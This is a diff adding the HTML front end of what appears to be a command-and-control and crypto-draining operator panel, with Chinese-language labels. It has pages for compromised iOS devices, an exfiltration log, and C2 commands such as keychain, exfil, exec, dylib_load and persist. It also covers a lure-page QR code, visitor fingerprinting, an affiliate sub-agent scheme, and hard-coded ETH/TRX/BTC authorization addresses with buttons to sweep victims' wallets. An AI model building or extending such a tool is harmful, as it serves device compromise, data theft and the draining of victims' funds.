+                  </tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Demo Overlay Panel -->
+        <div id="demo-overlay" class="hidden mb-4">
+          <!-- Phase Banner -->
+          <div id="demo-phase-banner" class="glass-card rounded-xl p-4 mb-3 border border-neon-blue/30 hidden">
+            <div class="flex items-center justify-between">
+              <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-neon-blue/15 flex items-center justify-center">
+                  <i data-lucide="radio" class="w-5 h-5 text-neon-blue"></i>
+                </div>
+                <div>
+                  <div class="flex items-center gap-2">
+                    <span class="text-sm font-semibold text-white" id="demo-phase-title">---</span>
+                    <span class="badge badge-blue font-mono" id="demo-phase-num">PHASE 0</span>
+                  </div>
+                  <p class="text-xs text-slate-dim mt-0.5" id="demo-phase-desc">---</p>
+                </div>
+              </div>
+              <div class="flex items-center gap-2">
+                <span class="layer-indicator layer-active pulse-dot"></span>
+                <span class="text-[10px] font-mono text-neon-green">LIVE</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Compromised Devices & Exfiltration Results -->
+          <div class="grid grid-cols-1 lg:grid-cols-2 gap-3">
+            <!-- Online Devices -->
+            <div id="demo-devices-panel" class="glass-card rounded-xl p-4 hidden">
+              <div class="flex items-center justify-between mb-3">
+                <h4 class="text-xs font-medium text-white flex items-center gap-2">
+                  <i data-lucide="smartphone" class="w-3.5 h-3.5 text-neon-red"></i> 已控制设备
+                </h4>
+                <span class="badge badge-red font-mono" id="demo-device-count">0</span>
+              </div>
+              <div id="demo-devices-list" class="space-y-2 max-h-[200px] overflow-y-auto exfil-panel"></div>
+            </div>
+
+            <!-- Exfiltration Results -->
+            <div id="demo-exfil-panel" class="glass-card rounded-xl p-4 hidden">
+              <div class="flex items-center justify-between mb-3">
+                <h4 class="text-xs font-medium text-white flex items-center gap-2">
+                  <i data-lucide="download-cloud" class="w-3.5 h-3.5 text-neon-amber"></i> 数据回传
+                </h4>
+                <span class="badge badge-amber font-mono" id="demo-exfil-count">0</span>
+              </div>
+              <div id="demo-exfil-list" class="space-y-2 max-h-[200px] overflow-y-auto exfil-panel"></div>
+            </div>
+          </div>
+
+          <!-- C2 Command Log -->
+          <div id="demo-c2-panel" class="glass-card rounded-xl p-4 mt-3 hidden">
+            <div class="flex items-center justify-between mb-3">
+              <h4 class="text-xs font-medium text-white flex items-center gap-2">
+                <i data-lucide="terminal" class="w-3.5 h-3.5 text-neon-cyan"></i> C2 指令日志
+              </h4>
+              <span class="badge badge-blue font-mono" id="demo-cmd-count">0</span>
+            </div>
+            <div id="demo-c2-list" class="space-y-1.5 max-h-[150px] overflow-y-auto exfil-panel font-mono text-[11px]"></div>
+          </div>
+        </div>
+
+        <!-- Bottom Stats Row -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+          <div class="glass-card glass-card-hover rounded-xl p-5 cursor-pointer">
+            <div class="flex items-center justify-between mb-3">
+              <p class="text-xs text-slate-dim">可归集总量</p>
+              <i data-lucide="trending-up" class="w-4 h-4 text-neon-amber"></i>
+            </div>
+            <p class="text-2xl font-bold text-neon-amber font-mono" id="stat-collectable">0</p>
+            <p class="text-[10px] text-slate-dim mt-2 font-mono" id="stat-collectable-sub">collectable assets</p>
+          </div>
+          <div class="glass-card glass-card-hover rounded-xl p-5 cursor-pointer">
+            <h3 class="text-xs text-slate-dim mb-3">域名分布</h3>
+            <div id="domain-grid">
+              <p class="text-sm text-slate-dim py-4 text-center font-mono">No domain data</p>
+            </div>
+          </div>
+          <div class="glass-card glass-card-hover rounded-xl p-5 cursor-pointer">
+            <div class="flex items-center justify-between mb-3">
+              <p class="text-xs text-slate-dim">威胁事件趋势</p>
+              <i data-lucide="activity" class="w-4 h-4 text-neon-blue"></i>
+            </div>
+            <div class="flex items-end gap-1 h-16" id="threat-timeline-bars">
+              <div class="flex-1 bg-neon-blue/10 rounded-t" style="height:10%"></div>
+            </div>
+            <div class="flex justify-between mt-2 text-[9px] text-slate-dim font-mono">
+              <span>12h ago</span><span>now</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Real Visitors + QR Code + Tools Row -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 mt-4">
+
+          <!-- Real Visitors Panel -->
+          <div class="lg:col-span-2 glass-card rounded-xl p-5">
+            <div class="flex items-center justify-between mb-3">
+              <h3 class="font-medium text-white flex items-center gap-2 text-sm">
+                <i data-lucide="eye" class="w-4 h-4 text-neon-cyan"></i> 真实访客记录
+              </h3>
+              <div class="flex items-center gap-2">
+                <span class="badge badge-cyan font-mono" id="visitor-total">0</span>
+                <button onclick="exportData('telemetry','csv')" class="text-[10px] text-slate-dim hover:text-neon-blue transition-colors cursor-pointer font-mono px-2 py-1 border border-void-border rounded hover:border-neon-blue/40">Telemetry CSV</button>
+                <button onclick="exportData('visitors','csv')" class="text-[10px] text-slate-dim hover:text-neon-blue transition-colors cursor-pointer font-mono px-2 py-1 border border-void-border rounded hover:border-neon-blue/40">CSV</button>
+                <button onclick="exportData('visitors','json')" class="text-[10px] text-slate-dim hover:text-neon-blue transition-colors cursor-pointer font-mono px-2 py-1 border border-void-border rounded hover:border-neon-blue/40">JSON</button>
+              </div>
+            </div>
+            <div class="overflow-x-auto">
+              <table class="w-full text-left">
+                <thead>
+                  <tr class="border-b border-void-border">
+                    <th class="text-[10px] font-medium text-slate-dim py-2 px-2 font-mono">IP</th>
+                    <th class="text-[10px] font-medium text-slate-dim py-2 px-2 font-mono">DEVICE</th>
+                    <th class="text-[10px] font-medium text-slate-dim py-2 px-2 font-mono">iOS</th>
+                    <th class="text-[10px] font-medium text-slate-dim py-2 px-2 font-mono">SCREEN</th>
+                    <th class="text-[10px] font-medium text-slate-dim py-2 px-2 font-mono">LANG</th>
+                    <th class="text-[10px] font-medium text-slate-dim py-2 px-2 font-mono">TIME</th>
+                  </tr>
+                </thead>
+                <tbody id="visitor-tbody">
+                  <tr><td colspan="6" class="text-center text-slate-dim text-xs py-6 font-mono">Waiting for visitors...</td></tr>
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+          <!-- QR Code + Webhook Config -->
+          <div class="space-y-4">
+            <!-- QR Code -->
+            <div class="glass-card rounded-xl p-5">
+              <div class="flex items-center justify-between mb-3">
+                <h3 class="font-medium text-white flex items-center gap-2 text-sm">
+                  <i data-lucide="qr-code" class="w-4 h-4 text-neon-green"></i> 投放页二维码
+                </h3>
+              </div>
+              <div id="qr-container" class="flex flex-col items-center gap-2">
+                <div class="bg-white rounded-lg p-2 w-[160px] h-[160px] flex items-center justify-center">
+                  <div id="qr-image" class="w-full h-full flex items-center justify-center text-slate-dim text-xs font-mono">Loading...</div>
+                </div>
+                <p id="qr-url" class="text-[10px] text-slate-dim font-mono text-center break-all max-w-[200px]">---</p>
+              </div>
+            </div>
+
+            <!-- Webhook Config -->
+            <div class="glass-card rounded-xl p-5">
+              <div class="flex items-center justify-between mb-3">
+                <h3 class="font-medium text-white flex items-center gap-2 text-sm">
+                  <i data-lucide="bell" class="w-4 h-4 text-neon-amber"></i> Webhook 通知
+                </h3>
+                <label class="toggle">
+                  <input type="checkbox" id="webhook-enabled" />
+                  <span class="toggle-slider"></span>
+                </label>
+              </div>
+              <div class="space-y-2">
+                <select id="webhook-type" class="w-full bg-void border border-void-border rounded-lg px-3 py-1.5 text-xs text-white focus:outline-none focus:border-neon-blue transition-colors cursor-pointer">
+                  <option value="generic">Generic HTTP POST</option>
+                  <option value="wechat_work">企业微信</option>
+                  <option value="dingtalk">钉钉</option>
+                  <option value="telegram">Telegram</option>
+                  <option value="feishu">飞书</option>
+                </select>
+                <input id="webhook-url" type="text" placeholder="Webhook URL"
+                  class="w-full bg-void border border-void-border rounded-lg px-3 py-1.5 text-xs text-white placeholder-slate-dim focus:outline-none focus:border-neon-blue transition-colors font-mono" />
+                <div class="flex gap-2">
+                  <button onclick="saveWebhook()" class="flex-1 text-[10px] bg-neon-blue hover:bg-blue-600 text-white px-3 py-1.5 rounded-lg cursor-pointer transition-colors">保存</button>
+                  <button onclick="testWebhook()" class="flex-1 text-[10px] border border-void-border text-slate-text hover:text-neon-blue hover:border-neon-blue/40 px-3 py-1.5 rounded-lg cursor-pointer transition-colors">测试</button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==================== PAGE: DEVICES ==================== -->
+      <div id="page-devices" class="page-view hidden">
+        <div class="glass-card rounded-xl p-4 mb-4">
+          <h2 class="text-sm font-medium mb-4 text-white" id="table-page-title">设备终端</h2>
+          <div class="flex flex-wrap gap-3 items-end">
+            <div>
+              <label class="text-[10px] text-slate-dim block mb-1 font-mono">device_id</label>
+              <input id="search-device-id" type="text" placeholder="请输入device_id"
+                class="bg-void border border-void-border rounded-lg px-3 py-1.5 text-sm text-white w-36 focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+            </div>
+            <div>
+              <label class="text-[10px] text-slate-dim block mb-1 font-mono">iOS(UID)</label>
+              <input id="search-uid" type="text" placeholder="请输入iOS"
+                class="bg-void border border-void-border rounded-lg px-3 py-1.5 text-sm text-white w-36 focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+            </div>
+            <div>
+              <label class="text-[10px] text-slate-dim block mb-1 font-mono">IP</label>
+              <input id="search-ip" type="text" placeholder="请输入IP"
+                class="bg-void border border-void-border rounded-lg px-3 py-1.5 text-sm text-white w-36 focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+            </div>
+            <div>
+              <label class="text-[10px] text-slate-dim block mb-1 font-mono">域名</label>
+              <input id="search-domain" type="text" placeholder="请输入域名"
+                class="bg-void border border-void-border rounded-lg px-3 py-1.5 text-sm text-white w-40 focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+            </div>
+            <button id="search-btn"
+              class="bg-neon-blue hover:bg-blue-600 text-white text-xs px-4 py-2 rounded-lg flex items-center gap-1.5 transition-colors cursor-pointer">
+              <i data-lucide="search" class="w-3.5 h-3.5"></i> 查询
+            </button>
+            <button id="reset-btn"
+              class="border border-void-border hover:border-neon-blue hover:text-neon-blue text-slate-text text-xs px-4 py-2 rounded-lg flex items-center gap-1.5 transition-colors bg-transparent cursor-pointer">
+              <i data-lucide="refresh-cw" class="w-3.5 h-3.5"></i> 重置
+            </button>
+            <label class="flex items-center gap-1.5 text-xs text-slate-text ml-auto cursor-pointer">
+              <input type="checkbox" id="filter-controlled" class="rounded border-void-border accent-neon-blue" />
+              只看受控设备
+            </label>
+          </div>
+        </div>
+        <div class="glass-card rounded-xl overflow-x-auto">
+          <table class="data-table w-full text-left" id="device-table">
+            <thead>
+              <tr>
+                <th>device_id</th><th>IP</th><th>iOS</th><th>版本号</th>
+                <th>任务数</th><th>线程</th><th>域名</th><th>状态</th>
+                <th>已授权</th><th>可归集</th>
+              </tr>
+            </thead>
+            <tbody id="device-tbody"></tbody>
+          </table>
+          <div id="empty-hint" class="text-center py-10 text-slate-dim text-sm font-mono">暂无设备数据，可通过 Add Agent 添加</div>
+        </div>
+      </div>
+
+      <!-- ==================== PAGE: AGENTS ==================== -->
+      <div id="page-agents" class="page-view hidden">
+        <div class="glass-card rounded-xl p-4 mb-4">
+          <div class="flex flex-wrap items-center justify-between gap-3 mb-4">
+            <h2 class="text-sm font-medium text-white">代理管理</h2>
+            <button id="add-proxy-btn"
+              class="bg-neon-blue hover:bg-blue-600 text-white text-xs px-4 py-1.5 rounded-lg flex items-center gap-1.5 transition-colors cursor-pointer">
+              <i data-lucide="plus" class="w-3.5 h-3.5"></i> 新增代理
+            </button>
+          </div>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
+            <div class="bg-void/60 rounded-lg border border-void-border p-4">
+              <p class="text-[10px] text-slate-dim mb-1 font-mono">下级代理总数</p>
+              <p class="text-xl font-bold text-white font-mono" id="stat-proxy-count">0</p>
+            </div>
+            <div class="bg-void/60 rounded-lg border border-void-border p-4">
+              <p class="text-[10px] text-slate-dim mb-1 font-mono">下级代理设备数</p>
+              <p class="text-xl font-bold text-neon-blue font-mono" id="stat-proxy-devices">0</p>
+            </div>
+            <div class="bg-void/60 rounded-lg border border-void-border p-4">
+              <p class="text-[10px] text-slate-dim mb-1 font-mono">下级代理总资产</p>
+              <p class="text-xl font-bold text-neon-amber font-mono" id="stat-proxy-assets">$0</p>
+            </div>
+          </div>
+        </div>
+        <div class="glass-card rounded-xl overflow-x-auto">
+          <table class="data-table w-full text-left">
+            <thead>
+              <tr><th>#</th><th>下级代理</th><th>上级</th><th>渠道码</th><th>设备数</th><th>总资产</th><th>状态</th><th>操作</th></tr>
+            </thead>
+            <tbody id="proxy-tbody"></tbody>
+          </table>
+          <div id="proxy-empty-hint" class="text-center py-10 text-slate-dim text-sm font-mono">暂无下级代理，点击「新增代理」添加</div>
+        </div>
+      </div>
+
+      <!-- ==================== PAGE: C2 ==================== -->
+      <div id="page-c2" class="page-view hidden">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-4">
+          <div class="glass-card rounded-xl p-5">
+            <h2 class="text-sm font-medium mb-3 text-white flex items-center gap-2">
+              <i data-lucide="radio" class="w-4 h-4 text-neon-green"></i> 活跃会话
+            </h2>
+            <div id="c2-sessions-list" class="space-y-2 max-h-[280px] overflow-y-auto text-xs font-mono"></div>
+            <div id="c2-sessions-empty" class="text-center py-8 text-slate-dim text-sm font-mono">暂无 C2 会话</div>
+          </div>
+          <div class="glass-card rounded-xl p-5">
+            <h2 class="text-sm font-medium mb-3 text-white flex items-center gap-2">
+              <i data-lucide="send" class="w-4 h-4 text-neon-blue"></i> 下发命令
+            </h2>
+            <div class="space-y-3">
+              <select id="c2-target-session" class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-xs font-mono text-white"></select>
+              <select id="c2-cmd-select" class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-xs font-mono text-white">
+                <option value="logmsg">logmsg</option>
+                <option value="hook_check">hook_check</option>
+                <option value="screenshot">screenshot</option>
+                <option value="keychain">keychain</option>
+                <option value="exfil">exfil</option>
+                <option value="exec">exec</option>
+                <option value="dylib_load">dylib_load</option>
+                <option value="persist">persist</option>
+                <option value="sleep">sleep</option>
+                <option value="collect">collect</option>
+                <option value="uninstall">uninstall</option>
+              </select>
+              <input id="c2-cmd-args" type="text" placeholder='{"msg":"hello"}' class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-xs font-mono text-white" />
+              <button id="c2-dispatch-btn" class="w-full bg-neon-blue hover:bg-blue-600 text-white text-xs py-2 rounded-lg cursor-pointer">Dispatch</button>
+            </div>
+          </div>
+        </div>
+        <div class="glass-card rounded-xl p-5">
+          <h2 class="text-sm font-medium mb-3 text-white">命令历史</h2>
+          <div id="c2-history-list" class="space-y-1 max-h-[240px] overflow-y-auto font-mono text-[11px]"></div>
+        </div>
+      </div>
+
+      <!-- ==================== PAGE: COLD ==================== -->
+      <div id="page-cold" class="page-view hidden">
+        <div class="glass-card rounded-xl p-5">
+          <div class="flex flex-wrap items-center justify-between gap-3 mb-4">
+            <h2 class="text-sm font-medium text-white">冷地址</h2>
+            <button id="add-cold-btn"
+              class="bg-neon-blue hover:bg-blue-600 text-white text-xs px-4 py-1.5 rounded-lg flex items-center gap-1.5 transition-colors cursor-pointer">
+              <i data-lucide="plus" class="w-3.5 h-3.5"></i> 新增冷地址
+            </button>
+          </div>
+          <form id="cold-add-form" class="hidden mb-4 p-4 rounded-lg border border-void-border bg-void/40 grid grid-cols-1 md:grid-cols-4 gap-3">
+            <div>
+              <label class="text-[10px] text-slate-dim block mb-1">链</label>
+              <select id="cold-chain" class="w-full bg-void border border-void-border rounded px-2 py-1.5 text-xs text-white">
+                <option value="ETH">ETH</option>
+                <option value="TRX">TRX</option>
+                <option value="BTC">BTC</option>
+              </select>
+            </div>
+            <div class="md:col-span-2">
+              <label class="text-[10px] text-slate-dim block mb-1">地址</label>
+              <input id="cold-address" type="text" placeholder="0x… / T… / bc1…"
+                class="w-full bg-void border border-void-border rounded px-2 py-1.5 text-xs font-mono text-white" />
+            </div>
+            <div>
+              <label class="text-[10px] text-slate-dim block mb-1">标签（可选）</label>
+              <input id="cold-label" type="text" placeholder="备注"
+                class="w-full bg-void border border-void-border rounded px-2 py-1.5 text-xs text-white" />
+            </div>
+            <div class="md:col-span-4 flex gap-2 justify-end">
+              <button type="button" id="cold-cancel-btn" class="text-xs px-3 py-1.5 rounded border border-void-border text-slate-dim hover:text-white cursor-pointer">取消</button>
+              <button type="submit" class="text-xs px-3 py-1.5 rounded bg-neon-green/20 text-neon-green border border-neon-green/30 hover:bg-neon-green/30 cursor-pointer">保存</button>
+            </div>
+          </form>
+          <table class="data-table w-full">
+            <thead><tr><th>地址</th><th>链</th><th>余额</th><th>最后活跃</th><th></th></tr></thead>
+            <tbody id="cold-tbody"></tbody>
+          </table>
+          <div id="cold-empty-hint" class="text-center py-10 text-slate-dim text-sm font-mono">暂无冷地址数据</div>
+        </div>
+      </div>
+
+      <!-- ==================== PAGE: ASSETS ==================== -->
+      <div id="page-assets" class="page-view hidden">
+        <div class="glass-card rounded-xl p-5 mb-4 border border-neon-cyan/20 bg-neon-cyan/5">
+          <p id="assets-rpc-hint" class="text-xs font-mono text-slate-text">
+            真实余额来自链上 RPC 扫描。请先在「归集地址」页配置 RPC 节点；钱包地址由 Implant 上报后自动入库。
+          </p>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-4 mb-4">
+          <div class="glass-card rounded-xl p-5">
+            <p class="text-xs text-slate-dim mb-2">总资产 (USD)</p>
+            <p class="text-2xl font-bold text-neon-amber font-mono" id="assets-total-usd">$0.00</p>
+          </div>
+          <div class="glass-card rounded-xl p-5">
+            <p class="text-xs text-slate-dim mb-2">可归集资产 (USD)</p>
+            <p class="text-2xl font-bold text-neon-green font-mono" id="assets-collectable-usd">$0.00</p>
+          </div>
+          <div class="glass-card rounded-xl p-5">
+            <p class="text-xs text-slate-dim mb-2">有余额设备</p>
+            <p class="text-2xl font-bold text-white font-mono" id="assets-device-count">0</p>
+          </div>
+          <div class="glass-card rounded-xl p-5">
+            <p class="text-xs text-slate-dim mb-2">钱包总数</p>
+            <p class="text-2xl font-bold text-neon-blue font-mono" id="assets-wallet-count">0</p>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-4 mb-4">
+          <div class="glass-card rounded-xl p-5 lg:col-span-1">
+            <h3 class="text-sm font-medium text-white mb-4 flex items-center gap-2">
+              <i data-lucide="pie-chart" class="w-4 h-4 text-neon-blue"></i> 链上分布
+            </h3>
+            <div id="assets-chain-breakdown" class="space-y-3"></div>
+          </div>
+          <div class="glass-card rounded-xl p-5 lg:col-span-2">
+            <h3 class="text-sm font-medium text-white mb-4 flex items-center gap-2">
+              <i data-lucide="trophy" class="w-4 h-4 text-neon-amber"></i> Top 设备
+            </h3>
+            <div id="assets-top-devices" class="space-y-2"></div>
+          </div>
+        </div>
+
+        <div class="glass-card rounded-xl p-5">
+          <div class="flex flex-wrap items-center justify-between gap-3 mb-4">
+            <h2 class="text-sm font-medium text-white flex items-center gap-2">
+              <i data-lucide="layout-list" class="w-4 h-4 text-neon-cyan"></i> 各设备资产明细
+            </h2>
+            <div class="flex flex-wrap gap-2">
+            <button id="assets-scan-btn"
+              class="text-xs px-3 py-1.5 rounded-lg bg-neon-blue/20 text-neon-blue border border-neon-blue/30 hover:bg-neon-blue/30 cursor-pointer font-mono">
+              RPC 扫描余额
+            </button>
+            <button id="assets-collect-btn"
+              class="text-xs px-3 py-1.5 rounded-lg bg-neon-green/20 text-neon-green border border-neon-green/30 hover:bg-neon-green/30 cursor-pointer font-mono">
+              执行归集
+            </button>
+            <button id="assets-refresh-btn"
+              class="text-xs px-3 py-1.5 rounded-lg border border-void-border text-slate-dim hover:text-white hover:border-neon-blue/40 cursor-pointer font-mono">
+              刷新
+            </button>
+            </div>
+          </div>
+          <div class="overflow-x-auto">
+            <table class="data-table w-full text-left">
+              <thead id="assets-thead">
+                <tr>
+                  <th>device_id</th>
+                  <th>合计 USD</th>
+                  <th>来源</th>
+                  <th>状态</th>
+                  <th>最后扫描</th>
+                </tr>
+              </thead>
+              <tbody id="assets-tbody"></tbody>
+            </table>
+          </div>
+          <div id="assets-empty-hint" class="text-center py-10 text-slate-dim text-sm font-mono hidden">暂无设备钱包地址 — 等待 Implant 上报</div>
+        </div>
+      </div>
+
+      <!-- ==================== PAGE: COLLECT ADDRESS ==================== -->
+      <div id="page-collectaddr" class="page-view hidden">
+        <div class="glass-card rounded-xl p-5">
+          <div class="flex flex-wrap items-center justify-between gap-3 mb-6">
+            <h2 class="text-sm font-medium flex items-center gap-2 text-white">
+              <i data-lucide="wallet" class="w-4 h-4 text-neon-blue"></i> 归集地址
+            </h2>
+            <button id="change-collect-btn"
+              class="bg-neon-blue hover:bg-blue-600 text-white text-xs px-4 py-1.5 rounded-lg flex items-center gap-1.5 transition-colors cursor-pointer">
+              <i data-lucide="key-round" class="w-3.5 h-3.5"></i> 更换归集地址
+            </button>
+          </div>
+          <div class="rounded-lg border border-neon-green/20 p-4 mb-4 bg-neon-green/5">
+            <div class="flex flex-wrap items-center justify-between gap-3">
+              <div class="flex items-center gap-2">
+                <i data-lucide="check-circle-2" class="w-5 h-5 text-neon-green"></i>
+                <span class="text-sm font-medium text-white">归集链路</span>
+                <span id="collect-asset-count" class="text-[10px] font-mono text-slate-dim">10 种资产</span>
+              </div>
+              <div id="collect-badges" class="flex flex-wrap gap-2"></div>
+            </div>
+          </div>
+          <div class="rounded-lg border border-void-border p-4 mb-4">
+            <h3 class="text-xs font-medium text-white mb-3 flex items-center gap-2">
+              <i data-lucide="key" class="w-4 h-4 text-neon-blue"></i> 授权地址
+            </h3>
+            <div class="auth-addr-row">
+              <span class="badge badge-amber shrink-0">ETH</span>
+              <span class="text-[10px] text-slate-dim shrink-0">USDC 授权合约</span>
+              <p class="text-xs font-mono break-all text-slate-text flex-1 min-w-0">0xb9a6caF83F8Db48D409f72edB93487d07469a447</p>
+            </div>
+            <div class="auth-addr-row">
+              <span class="badge badge-green shrink-0">TRX</span>
+              <span class="text-[10px] text-slate-dim shrink-0">USDT 授权合约</span>
+              <p class="text-xs font-mono break-all text-slate-text flex-1 min-w-0">TA9Gw65BgqebxGm4vVgSnTWhhRMgVtnZAP</p>
+            </div>
+            <div class="auth-addr-row">
+              <span class="badge badge-blue shrink-0">BTC</span>
+              <span class="text-[10px] text-slate-dim shrink-0">Taproot 授权</span>
+              <p class="text-xs font-mono break-all text-slate-text flex-1 min-w-0">bc1pul94ak359fsmd8sy44dfludrwumym26mfgapg0806qcn4q84gsnsfsy2hn</p>
+            </div>
+          </div>
+          <h3 class="text-xs font-medium text-white mb-3 flex items-center gap-2">
+            <i data-lucide="wallet" class="w-4 h-4 text-neon-blue"></i> 归集地址
+          </h3>
+          <div id="collect-addr-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-4"></div>
+          <div class="bg-void/40 rounded-lg border border-void-border p-4 mb-4">
+            <p class="text-[10px] text-slate-dim mb-1 font-mono">最后更新</p>
+            <p id="collect-updated-display" class="text-sm text-white">—</p>
+          </div>
+          <p class="text-[10px] text-slate-dim flex items-center gap-1 font-mono mb-6">
+            <i data-lucide="shield" class="w-3 h-3"></i> 支持 catalog 中全部 10 种归集资产，更换需验证强密码
+          </p>
+        </div>
+
+        <div class="glass-card rounded-xl p-5">
+          <div class="flex flex-wrap items-center justify-between gap-3 mb-4">
+            <h2 class="text-sm font-medium text-white flex items-center gap-2">
+              <i data-lucide="server" class="w-4 h-4 text-neon-cyan"></i> RPC 节点配置
+            </h2>
+            <div class="flex gap-2">
+              <button id="rpc-test-btn" class="text-xs px-3 py-1.5 rounded-lg border border-void-border text-slate-dim hover:text-white cursor-pointer font-mono">测试连接</button>
+              <button id="rpc-save-btn" class="text-xs px-3 py-1.5 rounded-lg bg-neon-blue text-white hover:bg-blue-600 cursor-pointer font-mono">保存 RPC</button>
+            </div>
+          </div>
+          <p class="text-[10px] text-slate-dim mb-4 font-mono">填写各链 RPC / API 后，资产看板可通过链上查询显示真实余额（非演示数据）。</p>
+          <div id="rpc-form-grid" class="grid grid-cols-1 md:grid-cols-2 gap-4"></div>
+          <div class="mt-3 flex items-end">
+            <p id="rpc-test-result" class="text-[10px] font-mono text-slate-dim">—</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- ==================== PAGE: RECORDS ==================== -->
+      <div id="page-records" class="page-view hidden">
+        <div class="glass-card rounded-xl p-5">
+          <div class="flex flex-wrap items-center justify-between gap-3 mb-4">
+            <h2 class="text-sm font-medium text-white">归集记录</h2>
+            <button id="records-collect-btn"
+              class="text-xs px-3 py-1.5 rounded-lg bg-neon-green/20 text-neon-green border border-neon-green/30 hover:bg-neon-green/30 cursor-pointer font-mono">
+              扫描并执行归集
+            </button>
+          </div>
+          <table class="data-table w-full">
+            <thead><tr><th>设备</th><th>链</th><th>数量</th><th>Tx Hash</th><th>状态</th><th>时间</th></tr></thead>
+            <tbody id="records-tbody"></tbody>
+          </table>
+          <div id="records-empty-hint" class="text-center py-10 text-slate-dim text-sm font-mono">暂无归集记录</div>
+        </div>
+      </div>
+
+    </main>
+  </div>
+</div>
+
+<!-- ==================== MODALS ==================== -->
+
+<!-- Change Collection Address Modal -->
+<div id="collect-modal" class="modal-backdrop fixed inset-0 z-[100] hidden items-center justify-center">
+  <div class="modal glass-card rounded-xl w-full max-w-lg shadow-2xl shadow-black/50 mx-4">
+    <div class="flex items-center justify-between px-5 py-4 border-b border-void-border">
+      <h3 class="font-medium text-white text-sm">更换归集地址</h3>
+      <button id="collect-modal-close" class="text-slate-dim hover:text-white text-xl leading-none cursor-pointer transition-colors">&times;</button>
+    </div>
+    <div class="p-5 space-y-4">
+      <div class="rounded-lg border border-neon-red/20 bg-neon-red/5 px-3 py-2 text-xs text-neon-red flex items-start gap-1.5">
+        <i data-lucide="alert-triangle" class="w-4 h-4 mt-0.5 shrink-0"></i>
+        <span>请先输入强密码验证身份，验证通过后可设置全部归集地址</span>
+      </div>
+      <div>
+        <label class="text-xs text-slate-text block mb-1">强密码验证</label>
+        <input id="collect-guard-pass" type="password" placeholder="请输入更换归集地址强密码"
+          class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+        <p id="collect-pass-error" class="text-xs text-neon-red mt-1 hidden">强密码错误，请重试</p>
+      </div>
+      <div id="collect-addr-fields" class="space-y-3 max-h-[50vh] overflow-y-auto opacity-50 pointer-events-none transition"></div>
+    </div>
+    <div class="flex justify-end gap-2 px-5 py-4 border-t border-void-border">
+      <button id="collect-modal-cancel" class="px-4 py-1.5 text-xs border border-void-border rounded-lg text-slate-text hover:border-neon-blue cursor-pointer transition-colors">取消</button>
+      <button id="collect-verify-btn" class="px-4 py-1.5 text-xs border border-neon-blue text-neon-blue rounded-lg hover:bg-neon-blue/10 cursor-pointer transition-colors">验证强密码</button>
+      <button id="collect-modal-save" disabled
+        class="px-4 py-1.5 text-xs bg-neon-blue text-white rounded-lg opacity-50 cursor-not-allowed transition-all">确认更换</button>
+    </div>
+  </div>
+</div>
+
+<!-- Add Sub-Proxy Modal -->
+<div id="proxy-modal" class="modal-backdrop fixed inset-0 z-[100] hidden items-center justify-center">
+  <div class="modal glass-card rounded-xl w-full max-w-md shadow-2xl shadow-black/50 mx-4">
+    <div class="flex items-center justify-between px-5 py-4 border-b border-void-border">
+      <h3 class="font-medium text-white text-sm">新增代理 · 下级代理</h3>
+      <button id="proxy-modal-close" class="text-slate-dim hover:text-white text-xl leading-none cursor-pointer transition-colors">&times;</button>
+    </div>
+    <div class="p-5 space-y-4">
+      <div>
+        <label class="text-xs text-slate-text block mb-1">代理名称</label>
+        <input id="proxy-name" type="text" placeholder="例如 Alpha代理-01"
+          class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+      </div>
+      <div>
+        <label class="text-xs text-slate-text block mb-1">上级代理</label>
+        <select id="proxy-parent" class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-sm text-white"></select>
+      </div>
+      <div>
+        <label class="text-xs text-slate-text block mb-1">登录账号（留空自动生成）</label>
+        <input id="proxy-login-user" type="text" placeholder="proxy_px_xxx"
+          class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-sm font-mono text-white focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+      </div>
+      <div>
+        <label class="text-xs text-slate-text block mb-1">登录密码（留空自动生成）</label>
+        <input id="proxy-login-pass" type="text" placeholder="自动生成并显示一次"
+          class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-sm font-mono text-white focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors" />
+      </div>
+      <div>
+        <label class="text-xs text-slate-text block mb-1">备注</label>
+        <textarea id="proxy-note" rows="2" placeholder="可选备注"
+          class="w-full bg-void border border-void-border rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-neon-blue placeholder-slate-dim transition-colors resize-none"></textarea>
+      </div>
+      <p id="proxy-create-result" class="text-[10px] font-mono text-neon-green hidden"></p>
+    </div>
+    <div class="flex justify-end gap-2 px-5 py-4 border-t border-void-border">
+      <button id="proxy-modal-cancel" class="px-4 py-1.5 text-xs border border-void-border rounded-lg text-slate-text hover:border-neon-blue cursor-pointer transition-colors">取消</button>
